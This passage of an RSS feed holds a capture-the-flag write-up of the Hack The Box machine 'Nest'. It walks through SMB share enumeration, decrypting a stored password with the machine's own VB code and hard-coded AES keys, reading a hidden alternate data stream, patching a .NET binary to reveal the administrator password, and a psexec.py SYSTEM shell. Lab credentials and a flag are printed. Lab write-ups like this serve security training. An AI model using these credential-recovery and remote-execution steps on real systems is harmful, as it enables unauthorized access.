+│   │   ├── NotepadPlusPlus
+│   │   │   ├── config.xml
+│   │   │   └── shortcuts.xml
+│   │   ├── RU Scanner
+│   │   │   └── RU_config.xml
+│   │   └── Server Manager
+│   ├── Installs
+│   ├── Reports
+│   └── Tools
+├── Production
+├── Reports
+└── Shared
+    ├── Maintenance
+    │   └── Maintenance Alerts.txt
+    └── Templates
+        ├── HR
+        │   └── Welcome Email.txt
+        └── Marketing
+</code></pre></div><p>Notepad++ config on <code>Data/IT/Configs/NotepadPlusPlus/config.xml</code> contains interesting path.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">...<span style="color:#f92672">&lt;SNIP&gt;</span>...
+    <span style="color:#f92672">&lt;History</span> <span style="color:#a6e22e">nbMaxFile=</span><span style="color:#e6db74">&#34;15&#34;</span> <span style="color:#a6e22e">inSubMenu=</span><span style="color:#e6db74">&#34;no&#34;</span> <span style="color:#a6e22e">customLength=</span><span style="color:#e6db74">&#34;-1&#34;</span><span style="color:#f92672">&gt;</span>
+        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span style="color:#f92672">/&gt;</span>
+        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span style="color:#f92672">/&gt;</span>
+        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;/History&gt;</span>
+<span style="color:#f92672">&lt;/NotepadPlus&gt;</span>
+</code></pre></div><p>Next, on <code>/Data/IT/Configs/RU Scanner/RU_config.xml</code>, I found a password that belongs to c.smith</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">→ root@iamf «RU Scanner» «192.168.43.234»
+$ cat RU_config.xml
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#f92672">&lt;ConfigFile</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;Port&gt;</span>389<span style="color:#f92672">&lt;/Port&gt;</span>
+  <span style="color:#f92672">&lt;Username&gt;</span>c.smith<span style="color:#f92672">&lt;/Username&gt;</span>
+  <span style="color:#f92672">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span style="color:#f92672">&lt;/Password&gt;</span>
+<span style="color:#f92672">&lt;/ConfigFile&gt;</span>
+</code></pre></div><p>It looks like a base64 encoded at first, but it is encrypted:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «RU Scanner» «192.168.43.234»
+$ echo <span style="color:#e6db74">&#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#39;</span> | base64 -d
+<span style="color:#f92672">}</span>13☺□♥□<span style="color:#f92672">=</span>X□J□BA□↓☺X*□Wc□f□□□?βc◄
+</code></pre></div><h4 id="secure-share">Secure$ share</h4>
+<p>User carl doesn&rsquo;t appear on my enumeration with <code>rpcclient</code>, so after discovering this path <code>\\HTB-NEST\Secure$\IT\Carl\</code>, I went back to <code>Secure$</code> share and performed a recursive download there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
+$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
+</code></pre></div><p>Here is the <code>Secure$</code> structure.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Secure$» «192.168.43.234»
+$ tree
+.
+├── Docs
+│   ├── ip.txt
+│   └── mmc.txt
+├── Reports
+└── VB Projects
+    ├── Production
+    └── WIP
+        └── RU
+            ├── RUScanner
+            │   ├── bin
+            │   │   ├── Debug
+            │   │   └── Release
+            │   ├── ConfigFile.vb
+            │   ├── Module1.vb
+            │   ├── My Project
+            │   │   ├── Application.Designer.vb
+            │   │   ├── Application.myapp
+            │   │   ├── AssemblyInfo.vb
+            │   │   ├── Resources.Designer.vb
+            │   │   ├── Resources.resx
+            │   │   ├── Settings.Designer.vb
+            │   │   └── Settings.settings
+            │   ├── obj
+            │   │   └── x86
+            │   ├── RU Scanner.vbproj
+            │   ├── RU Scanner.vbproj.user
+            │   ├── SsoIntegration.vb
+            │   └── Utils.vb
+            └── RUScanner.sln
+</code></pre></div><p>I just downloaded a VB Project. Based on <code>Module1.vb</code>&rsquo;s content, <code>RU_config.xml</code> is loaded to the application, and from this line <code>.Password = Utils.DecryptString(Config.Password)</code>, I know this application able to decrypt <code>c.smith</code>&rsquo;s password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vb" data-lang="vb"><span style="color:#960050;background-color:#1e0010">→</span> root<span style="color:#960050;background-color:#1e0010">@</span>iamf <span style="color:#960050;background-color:#1e0010">«</span>WIP<span style="color:#960050;background-color:#1e0010">»</span> <span style="color:#960050;background-color:#1e0010">«</span>192.168.43.234<span style="color:#960050;background-color:#1e0010">»</span>
+<span style="color:#960050;background-color:#1e0010">$</span> cat RU<span style="color:#f92672">/</span>RUScanner<span style="color:#f92672">/</span>Module1.vb
+<span style="color:#66d9ef">Module</span> Module1
+
+    <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Main</span>()
+        <span style="color:#66d9ef">Dim</span> Config <span style="color:#f92672">As</span> ConfigFile <span style="color:#f92672">=</span> ConfigFile.LoadFromFile(<span style="color:#e6db74">&#34;RU_Config.xml&#34;</span>)
+        <span style="color:#66d9ef">Dim</span> test <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> SsoIntegration <span style="color:#66d9ef">With</span> {.Username <span style="color:#f92672">=</span> Config.Username, .Password <span style="color:#f92672">=</span> Utils.DecryptString(Config.Password)}
+
+    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+
+<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Module</span>
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="access-as-csmith">Access as c.smith</h3>
+<h4 id="decrypting-csmith-password">Decrypting c.smith password</h4>
+<p>The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from <code>Utils.vb</code>, then call it on the main function. I used <a href="https://dotnetfiddle.net/">https://dotnetfiddle.net/</a> for this.</p>
+<p>Here is how it looks like.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vb" data-lang="vb"><span style="color:#66d9ef">Imports</span> System
+<span style="color:#66d9ef">Imports</span> System.Text
+<span style="color:#66d9ef">Imports</span> System.Security.Cryptography
+
+<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Module</span> Module1
+	<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Main</span>()
+		<span style="color:#66d9ef">Dim</span> encryptedPassword
+		encryptedPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>
+		Console.WriteLine(<span style="color:#e6db74">&#34;Decrypted Password: &#34;</span> <span style="color:#f92672">+</span>Utils.DecryptString(encryptedPassword))
+	<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Module</span>
+
+
+<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Class</span> <span style="color:#a6e22e">Utils</span>
+    <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Shared</span> <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">DecryptString</span>(EncryptedString <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>) <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
+        <span style="color:#66d9ef">If</span> <span style="color:#66d9ef">String</span>.IsNullOrEmpty(EncryptedString) <span style="color:#66d9ef">Then</span>
+            <span style="color:#66d9ef">Return</span> <span style="color:#66d9ef">String</span>.Empty
+        <span style="color:#66d9ef">Else</span>
+            <span style="color:#66d9ef">Return</span> Decrypt(EncryptedString, <span style="color:#e6db74">&#34;N3st22&#34;</span>, <span style="color:#e6db74">&#34;88552299&#34;</span>, 2, <span style="color:#e6db74">&#34;464R5DFA5DL6LE28&#34;</span>, 256)
+        <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">If</span>
+    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Function</span>
+    <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Shared</span> <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">Decrypt</span>(<span style="color:#66d9ef">ByVal</span> cipherText <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
+                                   <span style="color:#66d9ef">ByVal</span> passPhrase <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
+                                   <span style="color:#66d9ef">ByVal</span> saltValue <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
+                                    <span style="color:#66d9ef">ByVal</span> passwordIterations <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>, _
+                                   <span style="color:#66d9ef">ByVal</span> initVector <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
+                                   <span style="color:#66d9ef">ByVal</span> keySize <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>) _
+                           <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
+
+        <span style="color:#66d9ef">Dim</span> initVectorBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
+        initVectorBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes(initVector)
+
+        <span style="color:#66d9ef">Dim</span> saltValueBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
+        saltValueBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes(saltValue)
+
+        <span style="color:#66d9ef">Dim</span> cipherTextBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
+        cipherTextBytes <span style="color:#f92672">=</span> Convert.FromBase64String(cipherText)
+
+        <span style="color:#66d9ef">Dim</span> password <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> Rfc2898DeriveBytes(passPhrase, _
+                                           saltValueBytes, _
+                                           passwordIterations)
+
+        <span style="color:#66d9ef">Dim</span> keyBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
+        keyBytes <span style="color:#f92672">=</span> password.GetBytes(<span style="color:#66d9ef">CInt</span>(keySize <span style="color:#f92672">/</span> 8))
+
+        <span style="color:#66d9ef">Dim</span> symmetricKey <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> AesCryptoServiceProvider
+        symmetricKey.Mode <span style="color:#f92672">=</span> CipherMode.CBC
+
+        <span style="color:#66d9ef">Dim</span> decryptor <span style="color:#f92672">As</span> ICryptoTransform
+        decryptor <span style="color:#f92672">=</span> symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
+
+        <span style="color:#66d9ef">Dim</span> memoryStream <span style="color:#f92672">As</span> IO.MemoryStream
+        memoryStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">New</span> IO.MemoryStream(cipherTextBytes)
+
+        <span style="color:#66d9ef">Dim</span> cryptoStream <span style="color:#f92672">As</span> CryptoStream
+        cryptoStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">New</span> CryptoStream(memoryStream, _
+                                        decryptor, _
+                                        CryptoStreamMode.Read)
+
+        <span style="color:#66d9ef">Dim</span> plainTextBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
+        <span style="color:#66d9ef">ReDim</span> plainTextBytes(cipherTextBytes.Length)
+
+        <span style="color:#66d9ef">Dim</span> decryptedByteCount <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>
+        decryptedByteCount <span style="color:#f92672">=</span> cryptoStream.Read(plainTextBytes, _
+                                               0, _
+                                               plainTextBytes.Length)
+
+        memoryStream.Close()
+        cryptoStream.Close()
+
+        <span style="color:#66d9ef">Dim</span> plainText <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
+        plainText <span style="color:#f92672">=</span> Encoding.ASCII.GetString(plainTextBytes, _
+                                            0, _
+                                            decryptedByteCount)
+        <span style="color:#66d9ef">Return</span> plainText
+    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Function</span>
+<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Class</span>
+</code></pre></div><p>Now I have <code>c.smith</code>&rsquo;s password, <code>xRxRxPANCAK3SxRxRx</code></p>
+<p><div class="img-container"><img src="imgs/image-20210416080029703.png" alt="image-20210416080029703"  /></div>
+</p>
+<h4 id="users-share">Users share</h4>
+<p>With <code>c.smith</code> credentials, I do more enumeration on SMB. First, I&rsquo;ll look into the <code>c.smith</code> home directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
+$ smbclient -U <span style="color:#e6db74">&#39;c.smith%xRxRxPANCAK3SxRxRx&#39;</span> //10.10.10.178/Users 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 02:21:44 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 02:21:44 <span style="color:#ae81ff">2020</span>
+  HQK Reporting                       D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:06:17 <span style="color:#ae81ff">2019</span>
+  user.txt                            A       <span style="color:#ae81ff">32</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:05:24 <span style="color:#ae81ff">2019</span>
+</code></pre></div><p>I downloaded those files recursively to my machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
+$ tree
+.
+├── HQK Reporting
+│   ├── AD Integration Module
+│   │   └── HqkLdap.exe
+│   ├── Debug Mode Password.txt
+│   └── HQK_Config_Backup.xml
+└── user.txt
+</code></pre></div><p><code>user.txt</code> is the user flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
+$ cat user.txt
+cf71b25404be5d84fd827e05f426e987
+</code></pre></div><p><code>HQK_Config_Backup.xml</code> doesn&rsquo;t contains any useful information</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">→ root@iamf «c.smith» «192.168.43.234»
+$ cat HQK\ Reporting/HQK_Config_Backup.xml
+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#f92672">&lt;ServiceSettings</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;Port&gt;</span>4386<span style="color:#f92672">&lt;/Port&gt;</span>
+  <span style="color:#f92672">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span style="color:#f92672">&lt;/QueryDirectory&gt;</span>
+<span style="color:#f92672">&lt;/ServiceSettings&gt;</span>
+</code></pre></div><p><code>Debug Mode Password.txt</code> is empty file. But when I thought it was empty, I asked a hint for this.</p>
+<p>This file is embedded with Alternate Data Stream (ADS). By using the <code>allinfo</code> command on the SMB, I can see it contains another data stream, <code>Password:$Data</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210525005607779.png" alt="image-20210525005607779"  /></div>
+</p>
+<p>To get that stream, I can just append <code>:Password:$Data</code> at the end of the file name.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> allinfo <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:06:12 PM <span style="color:#ae81ff">2019</span> EDT
+access_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:06:12 PM <span style="color:#ae81ff">2019</span> EDT
+write_time:     Thu Aug  <span style="color:#ae81ff">8</span> 07:08:17 PM <span style="color:#ae81ff">2019</span> EDT
+change_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:08:17 PM <span style="color:#ae81ff">2019</span> EDT
+attributes: A <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>
+stream: <span style="color:#f92672">[</span>::$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span> bytes
+stream: <span style="color:#f92672">[</span>:Password:$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">15</span> bytes
+smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>:Password:$DATA
+getting file <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\D</span>ebug Mode Password.txt:Password:$DATA of size <span style="color:#ae81ff">15</span> as Debug Mode Password.txt:Password:$DATA <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>Now I can use the <code>cat</code> command to see the file content.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
+$ cat Debug<span style="color:#ae81ff">\ </span>Mode<span style="color:#ae81ff">\ </span>Password.txt:Password:<span style="color:#ae81ff">\$</span>DATA
+WBQ201953D8w
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="examination-on-hqk-reporting-service-v12">Examination on HQK Reporting Service v1.2</h4>
+<p>When visiting <code>http://10.10.10.178:4386/</code>, the browser return a session timeout with <code>&gt;</code> symbol, this could imply that this service is cli-based</p>
+<p>With <code>telnet</code>, I could access this service.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
+$ telnet 10.10.10.178 <span style="color:#ae81ff">4386</span>
+</code></pre></div><p><img src="imgs/image-20210416083748311.png" alt="image-20210416083748311" style="zoom: 80%;" /></p>
+<p>With debug mode enabled, it shows more commands.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&gt;debug WBQ201953D8w
+</code></pre></div><p><img src="imgs/image-20210416083637321.png" alt="image-20210416083637321" style="zoom: 80%;" /></p>
+<p>Took me a minute to understand the commands, so basically</p>
+<ul>
+<li>LIST is to list directory,</li>
+<li>SHOWQUERY is to show file content,</li>
+<li>RUNQUERY is to execute.</li>
+<li>SETDIR is change directory.</li>
+</ul>
+<p>Looking up into the LDAP directory, there&rsquo;s <code>ldap.conf</code> that contains administrator credentials with another encrypted password.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*0FINadW8yhptF6wzvidgsw.png" alt="img"  /></div>
+</p>
+<p>I have a copy of <code>HqkLdap.exe</code> on <code>c.smith</code>&rsquo;s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of <code>Ldap.conf</code>.</p>
+<h4 id="reversing-hqkldapexe">Reversing HQKLdap.exe</h4>
+<p>Running <code>strings</code> <code>HqkLdap.exe</code> againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.</p>
+<p><img src="imgs/image-20210416085451866.png" alt="image-20210416085451866" style="zoom:80%;" /></p>
+<p>Using immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called <code>dnSpy</code>. It&rsquo;s free on Github.</p>
+<ul>
+<li>dnSpy: <a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a></li>
+</ul>
+<p>For this I&rsquo;ll go straight to the application main function.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*W6q1GITk1OTtrEmoVEX98A.png" alt="img"  /></div>
+</p>
+<p>To run this program properly, a config file, which is <code>ldap.conf</code>, must be served as an argument to the application, and it also needs the presences of <code>HqkDbImport.exe</code> (These two must exist in the same folder)</p>
+<p><img src="imgs/image-20210416091107297.png" alt="image-20210416091107297" style="zoom:80%;" /></p>
+<p>So if I run it and I don&rsquo;t fulfill the check, it will complain like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\fahmi\Desktop&gt;.\HqkLdap.exe Ldap.conf
+Please ensure the optional database import module is installed
+</code></pre></div><p>Next, I investigated the decrypt function, which was called on the main after the checks were completed.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DoxZojo9U_5FVmtJBydPsg.png" alt="img"  /></div>
+</p>
+<p>On the next block, I see <code>ldapSearchSettings.Password</code> is assigned to <code>ldap.password</code></p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*B-sjrlUthEkQ0d6o855QMw.png" alt="img"  /></div>
+</p>
+<p>From here, what I can try is:</p>
+<ul>
+<li>Remove the part of codes that used to check for the existence of <code>HqkDbImport.exe</code></li>
+<li>Add another line to print out the password from <code>ldap.Password</code>.</li>
+</ul>
+<p>I&rsquo;ll use the edit feature to edit the main class.</p>
+<p><img src="imgs/image-20210416093818613.png" alt="image-20210416093818613" style="zoom:80%;" /></p>
+<p>Also, I’ll get rid the line that used to check the existence of <code>HqkDbImport.exe</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main()
+{
+  <span style="color:#66d9ef">checked</span>
+  { 
+    <span style="color:#66d9ef">try</span>
+    {
+      <span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>) 
+      {
+        Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line arguments&#34;</span>);
+      }
+      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (!File.Exists(MyProject.Application.CommandLineArgs[<span style="color:#ae81ff">0</span>]))
+      {
+        Console.WriteLine(<span style="color:#e6db74">&#34;Specified config file does not exist&#34;</span>);
+      }
+      <span style="color:#66d9ef">else</span> {
+...&lt;snip&gt; ...
+</code></pre></div><p>Then I’ll add a new line code on the main function at line 56 to print <code>ldap.Password</code> to the console.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*FvxtmqQKLEbY9tECtvRTtw.png" alt="img"  /></div>
+</p>
+<p>I tried to compile it back but then there was an error about the unassigned local variable &lsquo;enumerator&rsquo;, so I deleted that variable and tried to compile it back.</p>
+<p><div class="img-container"><img src="imgs/image-20210416094537134.png" alt="image-20210416094537134"  /></div>
+</p>
+<p>It succeeded and I can export the modified program.</p>
+<p>Now I can just run it and provide the <strong>ldap.conf</strong> as its argument and it works!</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png" alt="img"  /></div>
+</p>
+<p>The password is: <code>XtH4nkS4Pl4y1nGX</code></p>
+<h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
+<p>I can gain access as local system on the box using administrator account and the decrypted password with <code>psexec.py</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
+$ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
+Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.178.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file nQyIIpWk.exe
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.178.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service gfCe on 10.10.10.178.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service gfCe.....
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+nt authority<span style="color:#ae81ff">\s</span>ystem
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux">https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
